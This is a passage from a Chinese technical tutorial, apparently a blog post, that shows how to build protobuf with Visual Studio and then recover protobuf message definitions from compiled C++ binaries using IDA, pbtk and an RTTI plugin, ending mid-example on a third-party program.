<p>弹出的新窗口中架构输入 x64，点击完成。<br>等待项目配置，期间可能会报错找不到 googletest 文件夹，此时在中间的红色区域找到 <code>protobuf_BUILD_TESTS</code> 项目，将勾选取消，同时修改 CMAKE_INSTALL_PREFIX 项目为 build&#x2F;output。<br>再点击 Configure，日志中会输出 Configuring done，点击 Generate，输出 Generating done 时表示 Cmake 配置完成。</p>
<p>进入 build 目录，打开 protobuf.sln 解决方案，确保上方编译参数为 Debug、x64，在解决方案资源管理器中右键最上面的条目，选择生成解决方案，等待编译完成。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-2.png"
                     
                ></p>
<p>右键点击 CMakePredefinedTargets&#x2F;INSTALL 条目，选择生成，等待安装完毕，在 build&#x2F;output 目录下即可看到编译完成的链接库和 protoc.exe 编译器。</p>
<h3 id="编写测试项目"><a href="#编写测试项目" class="headerlink" title="编写测试项目"></a>编写测试项目</h3><p>新建一个 testProto.proto 文件，填写以下内容</p>
<div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;  </span><br><span class="line"><span class="keyword">package</span> mypb;  </span><br><span class="line"><span class="keyword">message </span><span class="title class_">helloworld</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">optional</span> <span class="type">int32</span> id = <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">optional</span> <span class="type">string</span> str = <span class="number">2</span>;  </span><br><span class="line">    <span class="keyword">optional</span> <span class="type">int32</span> num = <span class="number">3</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这是一个测试结构，定义了一个 helloworld 对象，具有 3 个成员，id、str 和 num，把文件放在和 protoc.exe 相同目录下，用 protoc 编译</p>
<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">protoc.exe testProto.proto <span class="literal">--cpp_out</span>=.\</span><br></pre></td></tr></table></figure></div>
<p>执行成功，会生成 testProto.pb.cc 和 testProto.pb.h 两个文件。可以打开这两个文件看看 proto 对象经过 protoc 处理后变成了什么样子，不过我们主要关心在逆向过程中如何恢复 proto 结构，所以先继续完成编译过程。</p>
<p>在 VS 中新建一个空白 C++ 项目，把这两个文件放在新项目的根目录下，打开项目，右侧解决方案管理器中分别将 testProto.pb.cc 和 testProto.pb.h 添加到 源文件、头文件，新建一个 main.cpp，填写以下内容</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;testProto.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//消息封装</span></span><br><span class="line">	mypb::helloworld in_msg;</span><br><span class="line">	&#123;</span><br><span class="line">		in_msg.<span class="built_in">set_id</span>(<span class="number">9</span>);</span><br><span class="line">		in_msg.<span class="built_in">set_str</span>(<span class="string">&quot;Jack&quot;</span>);</span><br><span class="line">		<span class="function">std::fstream <span class="title">output</span><span class="params">(<span class="string">&quot;./hello.log&quot;</span>, std::ios::out | std::ios::trunc | std::ios::binary)</span></span>;</span><br><span class="line">		<span class="keyword">if</span> (!in_msg.<span class="built_in">SerializeToOstream</span>(&amp;output)) &#123;</span><br><span class="line">			std::cerr &lt;&lt; <span class="string">&quot;failed to serialize in_msg&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//消息解析</span></span><br><span class="line">	mypb::helloworld out_msg;</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="function">std::fstream <span class="title">input</span><span class="params">(<span class="string">&quot;./hello.log&quot;</span>, std::ios::in | std::ios::binary)</span></span>;</span><br><span class="line">		<span class="keyword">if</span> (!out_msg.<span class="built_in">ParseFromIstream</span>(&amp;input)) &#123;</span><br><span class="line">			std::cerr &lt;&lt; <span class="string">&quot;failed to parse&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		std::cout &lt;&lt; out_msg.<span class="built_in">id</span>() &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; out_msg.<span class="built_in">str</span>() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-3.png"
                     
                ></p>
<p>右键点击 testProto 项目，选择属性 -&gt; C&#x2F;C++ -&gt; 常规，修改<strong>附加包含目录</strong>，填写 build&#x2F;output&#x2F;include，再选择链接器 -&gt; 常规，修改<strong>附加库目录</strong>，填写 build&#x2F;output&#x2F;lib，选择链接器 -&gt; 输入，修改<strong>附加依赖项</strong>，填写以下内容</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">libprotobufd.lib;libprotocd.lib;absl_bad_any_cast_impl.lib;absl_bad_optional_access.lib;absl_bad_variant_access.lib;absl_base.lib;absl_city.lib;absl_civil_time.lib;absl_cord.lib;absl_cord_internal.lib;absl_cordz_functions.lib;absl_cordz_handle.lib;absl_cordz_info.lib;absl_cordz_sample_token.lib;absl_crc32c.lib;absl_crc_cord_state.lib;absl_crc_cpu_detect.lib;absl_crc_internal.lib;absl_debugging_internal.lib;absl_demangle_internal.lib;absl_die_if_null.lib;absl_examine_stack.lib;absl_exponential_biased.lib;absl_failure_signal_handler.lib;absl_flags.lib;absl_flags_commandlineflag.lib;absl_flags_commandlineflag_internal.lib;absl_flags_config.lib;absl_flags_internal.lib;absl_flags_marshalling.lib;absl_flags_parse.lib;absl_flags_private_handle_accessor.lib;absl_flags_program_name.lib;absl_flags_reflection.lib;absl_flags_usage.lib;absl_flags_usage_internal.lib;absl_graphcycles_internal.lib;absl_hash.lib;absl_hashtablez_sampler.lib;absl_int128.lib;absl_kernel_timeout_internal.lib;absl_leak_check.lib;absl_log_entry.lib;absl_log_flags.lib;absl_log_globals.lib;absl_log_initialize.lib;absl_log_internal_check_op.lib;absl_log_internal_conditions.lib;absl_log_internal_fnmatch.lib;absl_log_internal_format.lib;absl_log_internal_globals.lib;absl_log_internal_log_sink_set.lib;absl_log_internal_message.lib;absl_log_internal_nullguard.lib;absl_log_internal_proto.lib;absl_log_severity.lib;absl_log_sink.lib;absl_low_level_hash.lib;absl_malloc_internal.lib;absl_periodic_sampler.lib;absl_random_distributions.lib;absl_random_internal_distribution_test_util.lib;absl_random_internal_platform.lib;absl_random_internal_pool_urbg.lib;absl_random_internal_randen.lib;absl_random_internal_randen_hwaes.lib;absl_random_internal_randen_hwaes_impl.lib;absl_random_internal_randen_slow.lib;absl_random_internal_seed_material.lib;absl_random_seed_gen_exception.lib;absl_random_seed_sequences.lib;absl_raw_hash_set.lib;absl_raw_logging_internal.lib;absl_scoped_set_env.lib;absl_spinlock_wait.lib;absl_stacktrace.lib;absl_status.lib;absl_statusor.lib;absl_str_format_internal.lib;absl_strerror.lib;absl_string_view.lib;absl_strings.lib;absl_strings_internal.lib;absl_symbolize.lib;absl_synchronization.lib;absl_throw_delegate.lib;absl_time.lib;absl_time_zone.lib;utf8_range.lib;utf8_validity.lib;%(AdditionalDependencies)</span><br></pre></td></tr></table></figure></div>

<p>修改完成，点击确定，然后点击绿色箭头编译并执行 main.cpp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-4.png"
                     
                ></p>
<h3 id="逆向分析程序"><a href="#逆向分析程序" class="headerlink" title="逆向分析程序"></a>逆向分析程序</h3><p>在项目的 x64&#x2F;Debug 目录下找到生成的 testProto.exe 程序，使用 IDA 打开分析。根据字符串可以先找到主函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_14035E010</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v12;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">222</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140326B0A(&amp;unk_140CD0147);</span><br><span class="line">  sub_1403100DF(v13);</span><br><span class="line">  sub_14031213C(v13, <span class="number">9</span>i64);</span><br><span class="line">  sub_14031CDD0(v13, <span class="string">&quot;Jack&quot;</span>);</span><br><span class="line">  sub_140322E8D(v14, <span class="number">280</span>i64);</span><br><span class="line">  sub_140323658(v14, <span class="string">&quot;./hello.log&quot;</span>, <span class="number">50</span>, <span class="number">64</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">    v21 = &amp;v15;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v21 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( sub_14030D448(v13, v21) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_140321DF8(v14);</span><br><span class="line">    sub_1403100DF(v16);</span><br><span class="line">    sub_140322E8D(v17, <span class="number">280</span>i64);</span><br><span class="line">    sub_140323658(v17, <span class="string">&quot;./hello.log&quot;</span>, <span class="number">33</span>, <span class="number">64</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_140328E1E(v16, v17) )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = sub_140322208(v16);</span><br><span class="line">      v6 = sub_14030DE2A(&amp;unk_140C57C50, v5);</span><br><span class="line">      sub_140318221(v6, sub_14030A1EE);</span><br><span class="line">      v7 = sub_14031FAA3(v16);</span><br><span class="line">      v8 = sub_1403230EF(&amp;unk_140C57C50, v7);</span><br><span class="line">      sub_140318221(v8, sub_14030A1EE);</span><br><span class="line">      sub_140321DF8(v17);</span><br><span class="line">      sub_140320E3A();</span><br><span class="line">      v20 = <span class="number">0</span>;</span><br><span class="line">      sub_14031BC23(v16);</span><br><span class="line">      sub_14031BC23(v13);</span><br><span class="line">      v3 = v20;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = sub_14030BFD0(&amp;qword_140C57DA0, <span class="string">&quot;failed to parse&quot;</span>);</span><br><span class="line">      sub_140318221(v4, sub_14030A1EE);</span><br><span class="line">      v19 = <span class="number">-1</span>;</span><br><span class="line">      sub_140321DF8(v17);</span><br><span class="line">      sub_14031BC23(v16);</span><br><span class="line">      sub_14031BC23(v13);</span><br><span class="line">      v3 = v19;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = sub_14030BFD0(&amp;qword_140C57DA0, <span class="string">&quot;failed to serialize in_msg&quot;</span>);</span><br><span class="line">    sub_140318221(v2, sub_14030A1EE);</span><br><span class="line">    v18 = <span class="number">-1</span>;</span><br><span class="line">    sub_140321DF8(v14);</span><br><span class="line">    sub_14031BC23(v13);</span><br><span class="line">    v3 = v18;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = v3;</span><br><span class="line">  sub_14032183F(v11, &amp;unk_14096C300);</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于编译导致信息丢失，反编译得到的代码和源代码有很大的区别，而且 protobuf 结构经过 protoc 编译之后会变成 C++ 中的一个类对象，再经过 C 编译器处理，大部分和原始对象有关的信息均已丢失。</p>
<p>和 JAVA 中的思路类似，当 proto 对象未采用 LITE_RUNTIME 模式编译时， 最终二进制程序内部包含描述信息，利用 pbtk 工具即可还原原始结构。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-5.png"
                     
                ></p>
<p>使用 from_binary.py 脚本得到的结果</p>
<div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> mypb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">helloworld</span> &#123;</span><br><span class="line">    <span class="keyword">oneof</span> _id &#123;</span><br><span class="line">        <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">oneof</span> _str &#123;</span><br><span class="line">        <span class="type">string</span> str = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">oneof</span> _num &#123;</span><br><span class="line">        <span class="type">int32</span> num = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>当程序不存在描述信息时，可以尝试寻找 proto 对象的 <code>_InternalSerialize</code> 函数。<br>以测试项目为例，在源代码中这个函数定义如下</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">::<span class="type">uint8_t</span>* helloworld::_InternalSerialize(</span><br><span class="line">    ::<span class="type">uint8_t</span>* target,</span><br><span class="line">    ::google::protobuf::io::EpsCopyOutputStream* stream) <span class="type">const</span> &#123;</span><br><span class="line">  <span class="comment">// @@protoc_insertion_point(serialize_to_array_start:mypb.helloworld)</span></span><br><span class="line">  ::<span class="type">uint32_t</span> cached_has_bits = <span class="number">0</span>;</span><br><span class="line">  (<span class="type">void</span>)cached_has_bits;</span><br><span class="line"></span><br><span class="line">  cached_has_bits = _impl_._has_bits_[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">// optional int32 id = 1;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000002</span>u) &#123;</span><br><span class="line">    target = ::google::protobuf::internal::WireFormatLite::</span><br><span class="line">        <span class="built_in">WriteInt32ToArrayWithField</span>&lt;<span class="number">1</span>&gt;(</span><br><span class="line">            stream, <span class="keyword">this</span>-&gt;_internal_id(), target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// optional string str = 2;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000001</span>u) &#123;</span><br><span class="line">    <span class="type">const</span> std::string&amp; _s = <span class="keyword">this</span>-&gt;_internal_str();</span><br><span class="line">    ::google::protobuf::internal::WireFormatLite::<span class="built_in">VerifyUtf8String</span>(</span><br><span class="line">        _s.<span class="built_in">data</span>(), <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(_s.<span class="built_in">length</span>()), ::google::protobuf::internal::WireFormatLite::SERIALIZE, <span class="string">&quot;mypb.helloworld.str&quot;</span>);</span><br><span class="line">    target = stream-&gt;<span class="built_in">WriteStringMaybeAliased</span>(<span class="number">2</span>, _s, target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// optional int32 num = 3;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000004</span>u) &#123;</span><br><span class="line">    target = ::google::protobuf::internal::WireFormatLite::</span><br><span class="line">        <span class="built_in">WriteInt32ToArrayWithField</span>&lt;<span class="number">3</span>&gt;(</span><br><span class="line">            stream, <span class="keyword">this</span>-&gt;_internal_num(), target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">PROTOBUF_PREDICT_FALSE</span>(_internal_metadata_.<span class="built_in">have_unknown_fields</span>())) &#123;</span><br><span class="line">    target =</span><br><span class="line">        ::_pbi::WireFormat::<span class="built_in">InternalSerializeUnknownFieldsToArray</span>(</span><br><span class="line">            _internal_metadata_.<span class="built_in">unknown_fields</span>&lt;::google::protobuf::UnknownFieldSet&gt;(::google::protobuf::UnknownFieldSet::default_instance), target, stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// @@protoc_insertion_point(serialize_to_array_end:mypb.helloworld)</span></span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>函数中通过 cached_has_bits 来判断当前处理的是哪个成员，后续的 WireFormatLite::xxx 函数中又包含当前字段在原始定义中的顺序。</p>
<p>为了找到 <code>_InternalSerialize</code> 函数，首先要在程序中定位 proto 对象位置，C++ 程序中可能会留下很多 RTTI 结构，RTTI 是 C++ 中的一种特性，允许程序在运行时得知某个对象的信息。使用开源工具 <a class="link"   href="https://github.com/rcx/classinformer-ida7" >https://github.com/rcx/classinformer-ida7<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 可以从程序中尝试还原这些信息。<br>在 testProto 上执行这个插件得到结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-6.png"
                     
                ></p>
<p>插件成功识别到了 helloworld proto 对象，双击来到对象位置，我们看到有 17 个方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-7.png"
                     
                ></p>
<p>依次分析各个函数就能找到 <code>_InternalSerialize</code> 函数</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_14035EAB0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+118h] [rbp+F8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_140326B0A</span>(&amp;unk_140CD02D2);</span><br><span class="line">  v8 = *<span class="built_in">sub_140325A98</span>(a1 + <span class="number">16</span>, <span class="number">0</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( (v8 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">sub_140309F23</span>(a1);</span><br><span class="line">    a2 = <span class="built_in">sub_14032414D</span>(a3, v3, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v8 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="built_in">sub_1403293E6</span>(a1);</span><br><span class="line">    v10 = <span class="built_in">sub_14032223A</span>(v9);</span><br><span class="line">    v4 = <span class="built_in">sub_140315D46</span>(v9);</span><br><span class="line">    <span class="built_in">sub_14030AC2A</span>(v4, v10, <span class="number">1</span>i64, <span class="string">&quot;mypb.helloworld.str&quot;</span>);</span><br><span class="line">    a2 = <span class="built_in">sub_140314E96</span>(a3, <span class="number">2</span>i64, v9, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v8 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">sub_140322CD5</span>(a1);</span><br><span class="line">    a2 = <span class="built_in">sub_1403140EF</span>(a3, v5, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_14032560B</span>(a1 + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">sub_1403171AA</span>(a1 + <span class="number">8</span>, sub_14031FF6C);</span><br><span class="line">    a2 = <span class="built_in">sub_14031A611</span>(v6, a2, a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对照源代码</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">::<span class="type">uint8_t</span>* helloworld::_InternalSerialize(</span><br><span class="line">    ::<span class="type">uint8_t</span>* target,</span><br><span class="line">    ::google::protobuf::io::EpsCopyOutputStream* stream) <span class="type">const</span> &#123;</span><br><span class="line">  <span class="comment">// @@protoc_insertion_point(serialize_to_array_start:mypb.helloworld)</span></span><br><span class="line">  ::<span class="type">uint32_t</span> cached_has_bits = <span class="number">0</span>;</span><br><span class="line">  (<span class="type">void</span>)cached_has_bits;</span><br><span class="line"></span><br><span class="line">  cached_has_bits = _impl_._has_bits_[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">// optional int32 id = 1;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000002</span>u) &#123;</span><br><span class="line">    target = ::google::protobuf::internal::WireFormatLite::</span><br><span class="line">        <span class="built_in">WriteInt32ToArrayWithField</span>&lt;<span class="number">1</span>&gt;(</span><br><span class="line">            stream, <span class="keyword">this</span>-&gt;_internal_id(), target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// optional string str = 2;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000001</span>u) &#123;</span><br><span class="line">    <span class="type">const</span> std::string&amp; _s = <span class="keyword">this</span>-&gt;_internal_str();</span><br><span class="line">    ::google::protobuf::internal::WireFormatLite::<span class="built_in">VerifyUtf8String</span>(</span><br><span class="line">        _s.<span class="built_in">data</span>(), <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(_s.<span class="built_in">length</span>()), ::google::protobuf::internal::WireFormatLite::SERIALIZE, <span class="string">&quot;mypb.helloworld.str&quot;</span>);</span><br><span class="line">    target = stream-&gt;<span class="built_in">WriteStringMaybeAliased</span>(<span class="number">2</span>, _s, target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// optional int32 num = 3;</span></span><br><span class="line">  <span class="keyword">if</span> (cached_has_bits &amp; <span class="number">0x00000004</span>u) &#123;</span><br><span class="line">    target = ::google::protobuf::internal::WireFormatLite::</span><br><span class="line">        <span class="built_in">WriteInt32ToArrayWithField</span>&lt;<span class="number">3</span>&gt;(</span><br><span class="line">            stream, <span class="keyword">this</span>-&gt;_internal_num(), target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">PROTOBUF_PREDICT_FALSE</span>(_internal_metadata_.<span class="built_in">have_unknown_fields</span>())) &#123;</span><br><span class="line">    target =</span><br><span class="line">        ::_pbi::WireFormat::<span class="built_in">InternalSerializeUnknownFieldsToArray</span>(</span><br><span class="line">            _internal_metadata_.<span class="built_in">unknown_fields</span>&lt;::google::protobuf::UnknownFieldSet&gt;(::google::protobuf::UnknownFieldSet::default_instance), target, stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// @@protoc_insertion_point(serialize_to_array_end:mypb.helloworld)</span></span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>反编译函数和源代码大体一致，首先，通过变量 v8(即 cached_has_bits) 我们知道这个 protobuf 对象应该有 3 个成员，接着要寻找成员 ID，对于 INT32 定义，比如 id 成员，在反编译中对应 v8 &amp; 2 分支，进入 sub_14032414D 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_14032414D</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_14035FBF0(a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再进入 sub_14035FBF0 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_14035FBF0</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+110h] [rbp+F0h]</span></span><br><span class="line"></span><br><span class="line">  sub_140326B0A(&amp;unk_140CD0295);</span><br><span class="line">  v7 = sub_14030A65D(a1, a3);</span><br><span class="line">  <span class="keyword">return</span> sub_14031923E(<span class="number">1</span>i64, a2, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到 sub_14031923E 的第一个参数为 1。</p>
<p>再用 num 成员来验证，进入 sub_1403140EF 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_1403140EF</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_14035FC70(a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再进入 sub_14035FC70 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_14035FC70</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+110h] [rbp+F0h]</span></span><br><span class="line"></span><br><span class="line">  sub_140326B0A(&amp;unk_140CD0295);</span><br><span class="line">  v7 = sub_14030A65D(a1, a3);</span><br><span class="line">  <span class="keyword">return</span> sub_14031923E(<span class="number">3</span>i64, a2, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>sub_14031923E 函数的第一个参数为 3，符合原始定义。</p>
<p>而对于 str 参数，在外部的 sub_140314E96 函数中就可以看到第二个参数为 2，说明它的 ID 为 2。<br>注意到当成员的类型不同时，代码中会存在不同的定义方法，实际可能要考虑多方情况。这种方式可以在缺少原始结构信息时作为辅助思路，缺点也很明显，无法得知成员的名称，且判断成员类型时还需要分析具体函数。</p>
<p>我们再以某第三方程序为例，此程序由 C++ 编写，使用了 protobuf，且程序中不存在描述信息。</p>
<p>首先使用 classinformer 插件找到感兴趣的 proto 对象，例如 UpdateProto</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-8.png"
                     
                ></p>
<p>依次分析这些函数，找到 <code>_InternalSerialize</code> 对应函数 sub_466A60</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">_BYTE *__thiscall <span class="title">sub_466A60</span><span class="params">(_DWORD *<span class="keyword">this</span>, _BYTE *a2, _DWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="keyword">this</span>[<span class="number">2</span>];</span><br><span class="line">  v15 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">4</span>) != <span class="number">0</span> )                          <span class="comment">// 1</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt;= *a3 )</span><br><span class="line">      v5 = <span class="built_in">sub_477210</span>(a2);</span><br><span class="line">    v6 = <span class="keyword">this</span>[<span class="number">6</span>];</span><br><span class="line">    *v5 = <span class="number">8</span>;                                    <span class="comment">// 1 * 8 = 8, index = 1</span></span><br><span class="line">    v7 = <span class="built_in">sub_467D80</span>(v6, v6 &gt;&gt; <span class="number">31</span>, v5 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v4) = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = a2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">8</span>) != <span class="number">0</span> )                          <span class="comment">// 2</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= *a3 )</span><br><span class="line">      v7 = <span class="built_in">sub_477210</span>(v7);</span><br><span class="line">    v11 = <span class="keyword">this</span>[<span class="number">7</span>];</span><br><span class="line">    *v7 = <span class="number">16</span>;                                   <span class="comment">// 2 * 8 = 16, index = 2</span></span><br><span class="line">    v7 = <span class="built_in">sub_467D80</span>(v11, <span class="built_in">HIDWORD</span>(v11), v7 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v4) = v15;</span><br><span 